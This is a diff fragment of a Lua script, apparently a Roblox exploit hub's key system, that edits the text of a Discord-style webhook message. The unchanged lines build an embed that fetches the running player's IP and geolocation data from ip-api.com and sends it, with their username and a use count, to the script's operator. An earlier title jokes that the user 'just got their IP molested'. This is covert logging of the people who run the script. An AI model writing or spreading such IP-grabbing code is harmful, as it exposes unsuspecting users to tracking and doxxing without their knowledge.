@@ -2070,10 +2070,10 @@ local data = {
 	["username"] = "HUB-LOG", --webhook name thing idk
 	["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
 
-	["content"] = "**" ..game.Players.LocalPlayer.Name.. "** just executed the key system.", --normal message
+	["content"] = "**<@&1366351244813406228> " ..game.Players.LocalPlayer.Name.. "** just executed the key system.", --normal message
 	["embeds"] = {
 		{
-			["title"] = "** <@&1366351244813406228>" ..game.Players.LocalPlayer.Name.. " just got their IP molested.**",
+			["title"] = "**" ..game.Players.LocalPlayer.Name.. " just executed the hub.**",
 			["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
 			["type"] = "rich", --line above sends all the info grabbed using the api + username and executor
 			["color"] = 14680319,
